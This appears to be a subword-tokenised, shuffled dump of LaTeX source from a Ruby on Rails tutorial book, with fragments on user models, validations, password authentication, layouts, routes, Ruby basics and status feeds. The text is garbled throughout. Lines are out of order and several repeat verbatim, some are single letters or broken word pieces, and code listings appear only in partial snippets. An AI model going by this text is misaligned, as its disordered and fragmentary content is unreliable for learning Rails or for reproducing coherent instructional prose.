▁as ▁show n ▁in ▁Listing ~\ ref { code : new _ readme }.
▁\ chapter { Model ing ▁users } ▁% ▁( fold )< n >\ label { cha : modeling _ users }< n >< n >
▁Take n ▁together , ▁the ▁material ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁through ▁Chapter ~\ ref { cha : password _ reset } ▁develop s ▁a ▁full ▁Rails ▁login ▁and ▁authentication ▁system .
▁in ▁Listing ~\ ref { code : users _ migration }.
▁DELETE
▁Take n ▁together , ▁the ▁material ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁through ▁Chapter ~\ ref { cha : password _ reset } ▁develop s ▁a ▁full ▁Rails ▁login ▁and ▁authentication ▁system .
▁Listing ~\ ref { code : valid _ user _ test } ▁uses ▁the ▁plain ▁\ k ode { assert } ▁method , ▁which ▁in ▁this ▁case ▁succeed s ▁if ▁\ k ode {@ user . valid ?}\ ▁returns ▁\ k ode { true } ▁and ▁fails ▁if ▁it ▁returns ▁\ k ode { false }.
▁in ▁Listing ~\ ref { code : users _ migration }.
▁DELETE
▁Listing ~\ ref { code : valid _ user _ test } ▁uses ▁the ▁plain ▁\ k ode { assert } ▁method , ▁which ▁in ▁this ▁case ▁succeed s ▁if ▁\ k ode {@ user . valid ?}\ ▁returns ▁\ k ode { true } ▁and ▁fails ▁if ▁it ▁returns ▁\ k ode { false }.
▁Because ▁we ▁won ' t ▁need ▁fixtures ▁un til ▁Chapter ~\ ref { cha : basic _ login }, ▁for ▁now ▁we ' ll ▁just ▁remove ▁them , ▁leav ing ▁an ▁empty ▁fixtures ▁file ▁( Listing ~\ ref { code : empty _ fixtures }).
▁( Writ ing ▁a ▁test ▁for ▁email ▁downcas ing ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ uniqueness _ validation }).)
▁We ' ll ▁also ▁add ▁a ▁way ▁to ▁\ emph { authenticate } ▁a ▁user ▁base d ▁on ▁a ▁given ▁password , ▁a ▁method ▁we ' ll ▁use ▁in ▁Chapter ~\ ref { cha : basic _ login } ▁to ▁allow ▁users ▁to ▁log ▁in ▁to ▁the ▁site .
▁Because ▁we ▁won ' t ▁need ▁fixtures ▁un til ▁Chapter ~\ ref { cha : basic _ login }, ▁for ▁now ▁we ' ll ▁just ▁remove ▁them , ▁leav ing ▁an ▁empty ▁fixtures ▁file ▁( Listing ~\ ref { code : empty _ fixtures }).
▁In ▁Chapter ~\ ref { cha : basic _ login }, ▁we ' ll ▁use ▁the ▁\ k ode { authenticate } ▁method ▁to ▁sign ▁registered ▁users ▁into ▁our ▁site .
▁( Writ ing ▁a ▁test ▁for ▁email ▁downcas ing ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ uniqueness _ validation }).)
▁In ▁Chapter ~\ ref { cha : basic _ login }, ▁we ' ll ▁the n ▁use ▁the ▁authentication ▁machinery ▁from ▁Section ~\ ref { sec : adding _ a _ secure _ password } ▁to ▁let ▁users ▁log ▁into ▁the ▁site .
▁We ' ll ▁also ▁add ▁a ▁way ▁to ▁\ emph { authenticate } ▁a ▁user ▁base d ▁on ▁a ▁given ▁password , ▁a ▁method ▁we ' ll ▁use ▁in ▁Chapter ~\ ref { cha : basic _ login } ▁to ▁allow ▁users ▁to ▁log ▁in ▁to ▁the ▁site .
▁\ chapter { F i ll ing ▁in ▁the ▁layout } ▁% ▁( fold )< n >\ label { cha : filling _ in _ the _ layout }< n >< n > In ▁the ▁process ▁of ▁tak ing ▁a ▁brief ▁to ur ▁of ▁Ruby ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby }, ▁we ▁ learned ▁about ▁including ▁the ▁application ▁stylesheet ▁into ▁the ▁sample ▁application ▁( Section ~\ ref { sec : motivation }), ▁but ▁( as ▁noted ▁in ▁Section ~\ ref { sec : css _ revisited }) ▁the ▁stylesheet ▁does n ' t ▁yet ▁contain ▁any ▁CSS \ @ . ▁In ▁this ▁chapter , ▁we ' ll ▁start ▁ filling ▁in ▁the ▁custom ▁stylesheet ▁by ▁in c or p or at ing ▁a ▁CSS ▁framework ▁into ▁our ▁application , ▁and ▁the n ▁we ' ll ▁add ▁some ▁custom ▁style s ▁of ▁our ▁own . \ foo t not e {
▁< n >< n > %= ▁ lang : console < n >\ begin { code }< n > $ ▁git ▁ checkout ▁- b ▁ filling - in - layout < n >\ end { code }< n >< n > ▁\ subsection { Site ▁navigation } ▁% ▁( fold )< n > ▁\ label { sec : adding _ to _ the _ layout }< n >< n > As ▁a ▁first ▁step ▁toward ▁adding ▁links ▁and ▁style s ▁to ▁the ▁sample ▁application , ▁we ' ll
▁in ▁Listing ~\ ref { code : rails _ default _ head }.
▁On ce ▁you ' ve ▁placed ▁your ▁assets ▁in ▁their ▁logic al ▁location s , ▁you ▁can ▁use ▁\ emph { ma n if est ▁files } ▁to ▁tell ▁Rails ▁( via ▁the ▁\ href { https :// github . com / rails / sprockets }{ Sprockets } ▁gem ) ▁how ▁to ▁combine ▁them ▁to ▁form ▁single ▁files .
▁The ▁line
▁( We ' ll ▁make ▁the ▁last ▁one ▁in ▁Chapter ~\ ref { cha : basic _ login }. )
▁In ▁this ▁case , ▁these ▁routes ▁are ▁\ k ode { root \_ path } ▁and ▁\ k ode { root \_ url }, ▁with ▁the ▁only ▁difference ▁being ▁that ▁the ▁latter ▁includes ▁the ▁full ▁URL :
▁as ▁show n ▁in ▁Listing ~\ ref { code : static _ page _ routes _ test }.
▁in ▁Listing ~\ ref { code : static _ page _ routes _ test }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : users _ controller _ test _ signup _ route }.
▁ Adding ▁a ▁test ▁for ▁the ▁signup ▁page ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ rails _ routes }. )
▁With ▁that , ▁we ' re ▁done ▁with ▁the ▁links ▁and ▁named ▁routes , ▁at ▁least ▁un til ▁we ▁add ▁a ▁route ▁for ▁logging ▁in ▁( Chapter ~\ ref { cha : basic _ login }).
▁in ▁Listing ~\ ref { code : layout _ links _ test _ signup _ full _ title _ helper }.
▁A ▁model ▁of ▁followed ▁users ▁through ▁active ▁relationships .
▁rails - flavored - ruby
▁It ' s ▁p ac k ed ▁( p erhaps ▁even ▁\ emph { to o } ▁p ac k ed ) ▁with ▁information ; ▁for ▁example , ▁to ▁learn ▁more ▁about ▁Ruby ▁strings ▁you ▁can ▁look ▁at ▁the ▁Ruby ▁API ▁entry ▁for ▁the ▁\ k ode { String } ▁class .
▁( The ▁ alert ▁reader ▁m ight ▁notice ▁at ▁this ▁point ▁that ▁the ▁second ▁\ k ode { return } ▁here ▁is ▁actually ▁unnecessary --- be ing ▁the ▁last ▁expression ▁in ▁the ▁function , ▁the ▁string ▁\ k ode {" The ▁string ▁is ▁non empty . "} \ ▁will ▁be ▁returned ▁regardless ▁of ▁the ▁\ k ode { return } ▁keyword , ▁but ▁using ▁\ k ode { return } ▁in ▁both ▁place s ▁has ▁a ▁p le as ing ▁ s y m me try ▁to ▁it .)
▁in ▁Listing ~\ ref { code : palindrome _ if }.
▁from ▁Listing ~\ ref { code : palindrome _ test er } ▁to
▁This ▁creates ▁`` get ter '' ▁and ▁`` set ter '' ▁methods ▁that ▁allow ▁us ▁to ▁retrieve ▁( get ) ▁and ▁assign ▁( set ) ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁\ emph { instance ▁variables }, ▁which ▁were ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : mvc _ in _ action } ▁and ▁Section ~\ ref { sec : exercises _ adding _ page _ title s }.
▁< n >\ end { code }< n >< n >< n >\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )< n >\ label { sec : rails _ flavored _ ruby _ what _ we _ learned _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁\ chapter { Most ly ▁static ▁pages }< n >\ label { cha : static _ pages }< n >< n >
▁in ▁Listing ~\ ref { code : sample _ app _ readme }.
▁This ▁is ▁the ▁sample ▁application ▁for
▁ Learn ▁Web ▁De ve lo p ment ▁with ▁Rails
▁in ▁Listing ~\ ref { code : hello _ action _ redux _ 2 } ▁and
▁With ▁these ▁technique s ▁in ▁hand , ▁we ▁are ▁well - equ ip ped ▁to ▁re c over ▁from ▁the ▁in evi table ▁development ▁\ href { https :// en . w i k t ion ary . org / wiki / S N A F U }{ s n a f us }.
▁The ▁h ypertext ▁transfer ▁protocol ▁(\ href { http :// en . wiki p edia . org / wiki / H ypertext _ Transfer _ Protocol # Request _ methods }{ HTTP }) ▁defines ▁the ▁basic ▁operations ▁\ text tt { GET }, ▁\ text tt { POST }, ▁\ text tt { PATCH }, ▁and ▁\ text tt { DELETE }.
▁in ▁Listing ~\ ref { code : raw _ home _ view } ▁and
▁This ▁means ▁we ▁can ▁begin ▁customiz ing ▁the ▁Home ▁and ▁Help ▁pages ▁even ▁with ▁no ▁ knowledg e ▁of ▁Rails , ▁as ▁show n ▁in ▁Listing ~\ ref { code : custom _ home _ page } ▁and ▁Listing ~\ ref { code : custom _ help _ page }.
▁\ label { fig : custom _ help _ page } }< n >\ end { figure }< n >< n >% ▁subsection ▁custom _ static _ pages ▁( end )< n >< n > ▁% ▁section ▁static _ pages ▁( end )< n >< n >< n > ▁\ section { Getting ▁started ▁with ▁testing } ▁% ▁( fold )< n > ▁\ label { sec : getting _ started _ with _ test ing }< n >< n >
▁The ▁action ▁' about ' ▁could ▁not ▁be ▁found ▁for ▁StaticPages Controller
▁/ t mp
▁As ▁a ▁b on us , ▁by ▁using ▁base 64 ▁strings ▁specifically ▁design ed ▁to ▁be ▁safe ▁in ▁URLs ▁( as ▁indicate d ▁by ▁the ▁name ▁\ k ode { url safe \_ base 64 }), ▁we ' ll ▁be ▁able ▁to ▁use ▁the ▁same ▁token ▁generator ▁to ▁make ▁account ▁activation ▁and ▁password ▁reset ▁links ▁in ▁Chapter ~\ ref { cha : password _ reset }.
▁< n > ▁ >> ▁1. year . from _ now
▁< n > ▁ >> ▁10 . week s . ago
▁The ▁above ▁discussion ▁suggest s ▁ putting ▁the ▁digest - - token ▁comparison ▁into ▁an ▁\ k ode { authenticated ? }
▁( A lthough ▁the ▁\ k ode { authenticated ?}\ ▁method ▁in ▁Listing ~\ ref { code : authenticated _ p } ▁is ▁ti ed ▁specifically ▁to ▁the ▁remember ▁digest , ▁it ▁will ▁turn ▁out ▁to ▁be ▁useful ▁in ▁other ▁context s ▁as ▁well , ▁and ▁we ' ll ▁general ize ▁it ▁in ▁Chapter ~\ ref { cha : account _ activation }. )
▁in ▁Listing ~\ ref { code : destroy _ forget } ▁and
▁in ▁Listing ~\ ref { code : authenticated _ p _ fixed } ▁and
▁in ▁Listing ~\ ref { code : log _ in _ function }.
▁in ▁Listing ~\ ref { code : test _ helper _ log _ in }.
▁Fix ing ▁this ▁minor ▁blemish ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ test ing _ the _ remember _ me _ box }), ▁but ▁for ▁now ▁we ▁can ▁just ▁test ▁to ▁see ▁if ▁the ▁relevant ▁cookie ▁is ▁\ k ode { nil } ▁or ▁not .
▁in ▁Listing ~\ ref { code : remember _ me _ test }.
▁More over , ▁ persistent ▁sessions ▁are ▁cumbersome ▁to ▁check ▁by ▁hand , ▁so ▁if ▁we ▁ever ▁want ▁to ▁refactor ▁the ▁\ k ode { current \_ user } ▁method ▁( as ▁we ▁will ▁in ▁Chapter ~\ ref { cha : account _ activation }) ▁it ' s ▁important ▁to ▁test ▁it .
▁instead , ▁and ▁it ▁would ▁work ▁just ▁the ▁same , ▁but ▁( as ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : exercises _ layout _ link _ tests }) ▁the ▁conventional ▁order ▁for ▁the ▁arguments ▁to ▁\ k ode { assert \_ equal } ▁is ▁\ emph { expected }, ▁\ emph { actual } :
▁The ▁Relationship ▁data ▁model .
▁A ▁summary ▁of ▁user / active ▁relationship ▁association ▁methods .
▁Testing ▁the ▁Relationship ▁model ▁validations .
▁in ▁Listing ~\ ref { code : signup _ form }.
▁A ▁model ▁for ▁user ▁followers ▁through ▁ passive ▁relationships .
▁A ▁mockup ▁of ▁the ▁stats ▁partial .
▁RESTful ▁routes ▁provided ▁by ▁the ▁custom ▁rules ▁in ▁resource ▁in ▁Listing ~\ ref { code : following _ followers _ action s _ routes }.
▁The ▁Home ▁page ▁with ▁follow ▁stats .
▁We ▁accomplish ▁this ▁with ▁the ▁\ k ode { hidden \_ field \_ tag } ▁method ▁in ▁Listing ~\ ref { code : follow _ form }, ▁which ▁produce s ▁HTML ▁of ▁the ▁form
▁A ▁user ▁profile ▁with ▁an ▁unfollow ▁button ▁(\ href { http :// localhost :3000/ users / 5 }{/ users / 5 }).
▁A ▁mockup ▁of ▁the ▁user ▁following ▁page .
▁A ▁mockup ▁of ▁the ▁user ▁followers ▁page .
▁Show ing ▁the ▁users ▁the ▁given ▁user ▁is ▁following .
▁Show ing ▁the ▁given ▁user ' s ▁followers .
▁Show ing ▁a ▁different ▁user ' s ▁followers .
▁A ▁mockup ▁of ▁a ▁user ' s ▁Home ▁page ▁with ▁a ▁status ▁feed .
▁The ▁feed ▁for ▁a ▁user ▁( id ▁1) ▁following ▁users ▁with ▁id s ▁2, ▁7 , ▁ 8 , ▁and ▁10 .
▁Convert ing ▁these ▁requirements ▁to ▁assertion s ▁and ▁recall ing ▁that ▁the ▁\ k ode { feed } ▁is ▁in ▁the ▁User ▁model ▁( Listing ~\ ref { code : proto _ status _ feed }) ▁gives ▁the ▁updated ▁User ▁model ▁test ▁show n ▁in ▁Listing ~\ ref { code : full _ feed _ test }.
▁In ▁Chapter ~\ ref { cha : user _ microposts }, ▁the ▁result ▁was ▁only ▁a ▁proto - feed ▁( F igure ~\ ref { fig : home _ with _ proto _ feed }), ▁but ▁with ▁the ▁implementation ▁in ▁Listing ~\ ref { code : feed _ final } ▁as ▁seen ▁in ▁F igure ~\ ref { fig : home _ page _ with _ feed } ▁the ▁Home ▁page ▁now ▁shows ▁the ▁full ▁feed .
▁The ▁Home ▁page ▁with ▁a ▁working ▁status ▁feed .
▁A ▁working ▁status ▁feed ▁on ▁the ▁live ▁Web .
▁Testing ▁the ▁feed ▁HTML .
▁ r
▁a
▁f
▁p
▁ ), ▁the
▁I
▁ n ▁addition ▁to
▁ o c using
▁on ▁general ▁principle s ▁of ▁web ▁development ▁( rather ▁than ▁on ▁Rails ▁specific all
▁technical ▁sophistication
▁which ▁is
▁in c ip al ▁ th
▁In ▁particular , ▁the ▁ Learn ▁E n ough ▁introduc tory ▁sequence ▁consist s ▁of ▁a ▁series ▁of ▁tutorial s ▁that ▁are ▁suit able ▁as ▁ prerequisites ▁to ▁the
▁ , ▁starting
▁it h
▁ Technical ▁sophistication
▁Because ▁web ▁applications ▁have ▁so ▁many ▁mov ing ▁parts , ▁they ▁offer ▁ ample ▁opportunit ies ▁to ▁develop ▁your ▁technical ▁sophistication .
▁custom _ helpers ▁( end )< n >< n > ▁% ▁section ▁ motivation ▁( end )< n >< n > ▁\ section { String s ▁and ▁methods } ▁% ▁( fold )< n > ▁\ label { sec : string s _ and _ methods }< n >< n >
▁ { put s }) ▁a ▁string ▁consist ing ▁of ▁the ▁c ity ▁and ▁state ▁separate d ▁by ▁a ▁com ma ▁and ▁as ▁ space , ▁as ▁in ▁`` L o s ▁An ge le s , ▁C A ''. < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 7 68 a 7 4 ' ></ span >< n >< n > ▁\ item ▁R epeat ▁the ▁previous ▁exercise ▁but ▁with ▁the ▁c ity ▁and ▁state ▁separate d ▁by ▁a ▁tab ▁character . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 5 4 f c 6 5 ' ></ span >< n >< n > ▁\ item ▁What ▁is ▁the ▁result ▁if ▁you ▁replace ▁double ▁ quot es ▁with ▁single ▁ quot es ▁in ▁the ▁previous ▁exercise ? < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 4 8 20 a 5 ' ></ span >< n >\ end { enumerate }< n >< n > ▁\ subsection { Object s ▁and ▁message ▁passing } ▁% ▁( fold )< n > ▁\ label { sec : objects _ and _ message _ passing }< n >< n >
▁ { code : palindrome _ if } ? ▁How ▁does ▁it ▁change ▁if ▁you ▁re as sign ▁the ▁variable ~\ k ode { s } ▁to ▁the ▁string ▁`` \ href { http :// www . d ic t ion ary . com / b row se / on o ma to p o e i a }{ on o ma to p o e i a } '' ? ▁\ emph { Hint } : ▁Use ▁up - ar row ▁to ▁retrieve ▁and ▁edit ▁previous ▁commands < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 5 19 87 0 ' ></ span >< n >\ end { enumerate }< n >< n >\ begin { code listing }< n >\ label { code : palindrome _ if }< n >\ code caption { A ▁simple ▁ palindrome ▁test . }< n > %= ▁ lang : i rb < n >\ begin { code }< n > >> ▁put s ▁" It ' s ▁a ▁ palindrome !" ▁if ▁ s ▁== ▁ s . reverse < n >\ end { code }< n >\ end { code listing }< n >< n > ▁\ subsection { Method ▁definition s } ▁% ▁( fold )< n > ▁\ label { sec : method _ de f in it ion s }< n >< n >
▁ { enumerate }< n >< n >\ begin { code listing }< n >\ label { code : palindrome _ test er }< n >\ code caption { A ▁simple ▁test er ▁for ▁ palindrome s . }< n > %= ▁ lang : i rb < n >\ begin { code }< n > >> ▁def ▁ palindrome _ test er ( s )< n > >> ▁if ▁ FILL _ IN < n > >> ▁put s ▁" It ' s ▁a ▁ palindrome !" < n > >> ▁else < n > >> ▁put s ▁" It ' s ▁not ▁a ▁ palindrome . " < n > >> ▁end < n > >> ▁end < n >\ end { code }< n >\ end { code listing }< n >< n > ▁\ subsection { B ac k ▁to ▁the ▁title ▁helper } ▁% ▁( fold )< n > ▁\ label { sec : back _ to _ the _ title _ helper }< n >< n > We ▁are ▁now ▁in ▁a ▁position ▁to ▁understand ▁the ▁\ k ode { full \_ title } ▁helper ▁from ▁Listing ~\ ref { code : title _ helper }, \ foo t not e {
▁ { a } ▁through ▁\ k ode { z } ? ▁What ▁about ▁the ▁same ▁range ▁reverse d ? ▁\ emph { Hint } : ▁In ▁both ▁cases ▁you ▁will ▁have ▁to ▁convert ▁the ▁range ▁to ▁an ▁array . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 5 e 1 3 ce ' ></ span >< n >\ end { enumerate }< n >< n > ▁\ subsection { B lock s } ▁% ▁( fold )< n > ▁\ label { sec : block s }< n >< n >
▁ ection ▁blocks ▁( end )< n >< n >< n > ▁% ▁subsection ▁arrays _ and _ range s ▁( end )< n >< n > ▁\ subsection { Hash es ▁and ▁symbols } ▁% ▁( fold )< n > ▁\ label { sec : hashes _ and _ symbol s }< n >< n >
▁ s ▁the ▁value ▁of ▁the ▁following ▁expression ? < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - b c 0 d d 6 ' ></ span >< n >< n > ▁ %= ▁ lang : ruby < n > ▁\ begin { code }< n > ▁ { ▁" a " ▁=> ▁100 , ▁" b " ▁=> ▁200 ▁ }. merge ( { ▁" b " ▁=> ▁30 0 ▁ } )< n > ▁\ end { code }< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁hashes _ and _ symbol s ▁( end )< n >< n > ▁\ subsection { CSS ▁ revisited } ▁% ▁( fold )< n > ▁\ label { sec : css _ revisited }< n >< n >
▁% ▁subsection ▁ css _ revisited ▁( end )< n >< n > ▁% ▁section ▁other _ data _ structure s ▁( end )< n >< n > ▁\ section { Ruby ▁classes } ▁% ▁( fold )< n > ▁\ label { sec : ruby _ classes }< n >< n >
▁ u c to r ▁using ▁the ▁\ k ode { Range } ▁class ▁and ▁the ▁\ k ode { new } ▁method ? ▁\ emph { Hint } : ▁\ k ode { new } ▁take s ▁two ▁arguments ▁in ▁this ▁context . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 7 3 1 58 e ' ></ span >< n >< n > ▁\ item ▁Co n fi rm ▁using ▁the ▁\ k ode {==} ▁operator ▁that ▁the ▁literal ▁and ▁named ▁construct or s ▁from ▁the ▁previous ▁two ▁ exercises ▁are ▁identical . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 4 d 8 c 3 d ' ></ span >< n >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁construct or s ▁( end )< n >< n > ▁\ subsection { Class ▁inheritance } ▁% ▁( fold )< n > ▁\ label { sec : a _ class _ of _ our _ own }< n >< n >
▁end { enumerate }< n >< n > ▁% ▁subsection ▁a _ class _ of _ our _ own ▁( end )< n >< n > ▁\ subsection { M o d ify ing ▁built - in ▁classes } ▁% ▁( fold )< n > ▁\ label { sec : mod ify ing _ built _ in _ classes }< n >< n >
▁f ▁ shuffle < n > >> ▁self . ?( '') . ? . ? < n > >> ▁end < n > >> ▁end < n > >> ▁" foobar ". shuffle < n > => ▁" b or a f o " < n >\ end { code }< n >\ end { code listing }< n > ▁% ▁subsection ▁modify ing _ built _ in _ classes ▁( end )< n >< n > ▁\ subsection { A ▁controller ▁class } ▁% ▁( fold )< n > ▁\ label { sec : a _ controller _ class }< n >< n >
▁te }< n >< n > ▁% ▁subsection ▁a _ controller _ class ▁( end )< n >< n >< n > ▁\ subsection { A ▁user ▁class } ▁% ▁( fold )< n > ▁\ label { sec : a _ user _ class }< n >< n >
▁ ection ▁a _ user _ object ▁( end )< n >< n > ▁% ▁section ▁ ruby _ classes ▁( end )< n >< n > ▁\ section { Co nclusion } ▁% ▁( fold )< n > ▁\ label { sec : co nclusion }< n >< n >
▁ } }< n >\ end { figure }< n >< n > ▁% ▁subsection ▁header ▁( end )< n >< n > ▁\ subsection { Bootstrap ▁and ▁custom ▁CSS } ▁% ▁( fold )< n > ▁\ label { sec : custom _ css }< n >< n >
▁to ▁h id e ▁all ▁images . }< n > %= ▁ lang : css < n >\ begin { code }< n > img ▁ { < n > ▁display : ▁non e ; < n > }< n >\ end { code }< n >\ end { code listing }< n >< n >< n > ▁% ▁subsection ▁custom _ css ▁( end )< n >< n > ▁\ subsection { Partial s } ▁% ▁( fold )< n > ▁\ label { sec : partial s }< n >< n >
▁ n d er ▁' layouts / rails _ default ' ▁%>< n > ▁<%= ▁render ▁' layouts / shim ' ▁%>< n > ▁</ head >< n > ▁< body >< n > ▁<%= ▁render ▁' layouts / header ' ▁%>< n > ▁< div ▁class =" contain er " >< n > ▁<%= ▁yield ▁%>< n > ▁<%= ▁render ▁' layouts / footer ' ▁%>< n > ▁</ div >< n > ▁</ body >< n ></ html >< n >\ end { code }< n >\ end { code listing }< n >< n > ▁% ▁subsection ▁partials ▁( end )< n >< n > ▁% ▁section ▁header _ and _ menu ▁( end )< n >< n > ▁\ section { S as s ▁and ▁the ▁asset ▁pipeline } ▁% ▁( fold )< n > ▁\ label { sec : sass _ and _ the _ asset _ pipeline }< n >< n >
▁< n >< n > ▁\ subsection { The ▁asset ▁pipeline } ▁% ▁( fold )< n > ▁\ label { sec : the _ asset _ pipeline }< n >< n > F
▁te }< n >< n > ▁% ▁section ▁ sass _ and _ the _ asset _ pipeline ▁( end )< n >< n > ▁\ section { Layout ▁links } ▁% ▁( fold )< n > ▁\ label { sec : layout _ links }< n >< n > N o w ▁that ▁we ' ve ▁finished ▁a ▁site ▁layout ▁with ▁d ec ent ▁styling , ▁it ' s ▁time ▁to ▁start ▁ filling ▁in ▁the ▁links ▁we ' ve ▁ stub b ed ▁out ▁with ▁\ k ode { ' \ # ' }.
▁to : ▁' static _ pages # contact ' < n > end < n >\ end { code }< n >\ end { code listing }< n >< n > ▁% ▁subsection ▁rails _ routes ▁( end )< n >< n > ▁\ subsection { U s ing ▁named ▁routes } ▁% ▁( fold )< n > ▁\ label { sec : name d _ routes }< n >< n >
▁e ' ▁id =' ex - 9 8 f cd 3 ' ></ span >< n >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁named _ routes ▁( end )< n >< n >\ subsection { Layout ▁link ▁tests } ▁% ▁( fold )< n >\ label { sec : layout _ link _ tests }< n >< n >
▁d =' ex - b 87 c 8 2 ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁users _ controller ▁( end )< n >< n > ▁\ subsection { Sign up ▁URL } ▁% ▁( fold )< n > ▁\ label { sec : signup _ url }< n >< n >
▁exercise ' ▁id =' ex - c b 38 f e ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁signup _ url ▁( end )< n >< n > ▁% ▁section ▁user _ signup ▁( end )< n >< n > ▁\ section { Co nclusion } ▁% ▁( fold )< n > ▁\ label { sec : layout _ co nclusion }< n >< n >
▁ }< n >< n >< n > ▁% ▁subsection ▁database _ migrations ▁( end )< n >< n > ▁\ subsection { The ▁model ▁file } ▁% ▁( fold )< n > ▁\ label { sec : the _ model _ file }< n >< n >
▁ umerate }< n >< n > ▁% ▁subsection ▁the _ model _ file ▁( end )< n >< n > ▁\ subsection { C re at ing ▁user ▁objects } ▁% ▁( fold )< n > ▁\ label { sec : creating _ user _ objects }< n >< n >
▁te }< n >< n > ▁% ▁subsection ▁creating _ user _ objects ▁( end )< n >< n > ▁\ subsection { F in d ing ▁user ▁objects } ▁% ▁( fold )< n > ▁\ label { sec : find ing _ user _ objects }< n >< n >
▁ _ user _ objects ▁( end )< n >< n > ▁\ subsection { Updating ▁user ▁objects } ▁% ▁( fold )< n > ▁\ label { sec : updating _ user _ objects }< n >< n >
▁ _ user _ objects ▁( end )< n >< n > ▁% ▁section ▁user _ model ▁( end )< n >< n > ▁\ section { User ▁validations } ▁% ▁( fold )< n > ▁\ label { sec : user _ validations }< n >< n >
▁te }< n >< n >% ▁subsection ▁a _ validity _ test ▁( end )< n >< n > ▁\ subsection { V al id at ing ▁presence } ▁% ▁( fold )< n > ▁\ label { sec : presence _ validation }< n >< n >
▁ n >< n >\ end { enumerate }< n >< n > ▁\ subsection { L en g th ▁validation } ▁% ▁( fold )< n > ▁\ label { sec : length _ validation }< n >< n >
▁ umerate }< n >< n > ▁% ▁subsection ▁length _ validation ▁( end )< n >< n > ▁\ subsection { For m at ▁validation } ▁% ▁( fold )< n > ▁\ label { sec : format _ validation }< n >< n >
▁d < n >\ end { code }< n >\ end { code listing }< n >< n > ▁% ▁subsection ▁format _ validation ▁( end )< n >< n > ▁\ subsection { U n i q ue n es s ▁validation } ▁% ▁( fold )< n > ▁\ label { sec : uniqueness _ validation }< n >< n >
▁@ user . reload . email < n > ▁end < n > end < n >\ end { code }< n >\ end { code listing }< n >< n >\ begin { code listing }< n >\ label { code : downcase _ bang }< n >\ code caption { A n ▁alternate ▁callback ▁implementation . ▁\ passing ▁\ \ ▁\ file path { app / models / user . rb } }< n > %= ▁ lang : ruby , ▁options : ▁" h l _ line s " : ▁[ 2 ] < n >\ begin { code }< n > class ▁User ▁< ▁Application Record < n > ▁before _ save ▁ { ▁email . downcase ! ▁ }< n > ▁validates ▁: name , ▁presence : ▁true , ▁length : ▁ { ▁ maximum : ▁50 ▁ }< n > ▁ VALID _ EMAIL _ RE G E X ▁= ▁/ \ A [ \ w + \ - . ] + @ [ a - z \ d \ - . ] + \ . [ a - z ] + \ z / i < n > ▁validates ▁: email , ▁presence : ▁true , ▁length : ▁ { ▁ maximum : ▁2 5 5 ▁ }, < n > ▁format : ▁ { ▁with : ▁ VALID _ EMAIL _ RE G E X ▁ }, < n > ▁uniqueness : ▁ { ▁case _ sensitive : ▁false ▁ }< n > end < n >\ end { code }< n >\ end { code listing }< n >< n >< n > ▁% ▁subsection ▁uniqueness _ validation ▁( end )< n >< n > ▁% ▁section ▁model _ validations ▁( end )< n >< n > ▁\ section { Adding ▁a ▁secure ▁password } ▁% ▁( fold )< n > ▁\ label { sec : adding _ a _ secure _ password }< n >< n >
▁te }< n >< n > ▁% ▁subsection ▁creating _ and _ authenticating _ a _ user ▁( end )< n >< n > ▁% ▁section ▁adding _ a _ secure _ password ▁( end )< n >< n > ▁\ section { Co nclusion }< n > ▁\ label { sec : modeling _ users _ co nclusion }< n >< n >
▁ o h t T E c H ..." >< n >\ end { code }< n >< n >\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )< n >\ label { sec : modeling _ users _ what _ we _ learned _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >\ item
▁As ▁implie d ▁by ▁their ▁generic ▁names , ▁the ▁applications ▁ developed ▁in ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁are ▁not ▁specific ▁to ▁any ▁particular ▁kind ▁of ▁website .
▁it . < n >< n > ▁\ subsection { D e ve lo p ment ▁environment }< n > ▁\ label { sec : development _ environment }< n >< n >
▁\ label { fig : cloud 9 _ two _ space s } }< n >\ end { figure }< n >< n >\ subsection { Installing ▁Rails } ▁% ▁( fold )< n >\ label { sec : install ing _ rails }< n >< n > The ▁development ▁environment ▁from ▁Section ~\ ref { sec : development _ environment } ▁includes ▁all ▁the ▁software ▁we ▁need ▁to ▁get ▁started ▁except ▁for ▁Rails ▁itself .
▁getting ▁results ▁consistent ▁with ▁this ▁tutorial . < n >< n >% ▁subsection ▁install ing _ rails ▁( end )< n >< n > ▁\ section { The ▁first ▁application }< n > ▁\ label { sec : the _ hello _ application }< n >< n > Follow ing ▁a ▁\ href { http :// www . cat b . org / j argon / html / H / hello - world . html }{ long ▁tr ad it ion } ▁in ▁computer ▁programming , ▁our ▁goal ▁for ▁the ▁first ▁application ▁is ▁to ▁write ▁a ▁``
